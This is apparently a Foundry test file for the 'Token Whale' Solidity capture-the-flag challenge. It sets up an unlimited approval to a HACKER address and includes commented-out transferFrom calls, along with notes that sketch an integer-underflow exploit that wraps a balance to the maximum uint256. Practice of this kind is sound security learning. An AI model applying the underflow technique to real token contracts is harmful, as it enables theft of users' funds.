// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/TokenWhale.sol";


contract TokenWhaleTest is Test {
    TokenWhaleChallenge private tokenwhale;
    address private constant ALICE = address(0x1);
    address private constant HACKER = address(0x2);
    function setUp() external {
        tokenwhale = new TokenWhaleChallenge(ALICE);
        vm.deal(ALICE, 10 ether);
        vm.startPrank(ALICE);
        vm.deal(HACKER, 2 ether);
    }

    // accumulate at least 1kk tokens
    function testHack() external {
        tokenwhale.approve(HACKER, type(uint).max);
        vm.stopPrank();

        // vm.startPrank(HACKER);
        // tokenwhale.transferFrom(ALICE, HACKER, 1);
        // tokenwhale.transferFrom(ALICE, HACKER, type(uint).max - 1);
        // vm.stopPrank();
    }

    // 1 alice balance > 1?
    // 2 HACKER balance + 1 >= HACKER balance?
    // 3 allowance[ALICE][HACKER] >= 1?
    // 4 allowance[ALICE][HACKER] -= 1
    // 5 from ALICE to HACKER 1
    // contract token balance = 0 -1 = max uint256
    // HACKER balance + 1 
}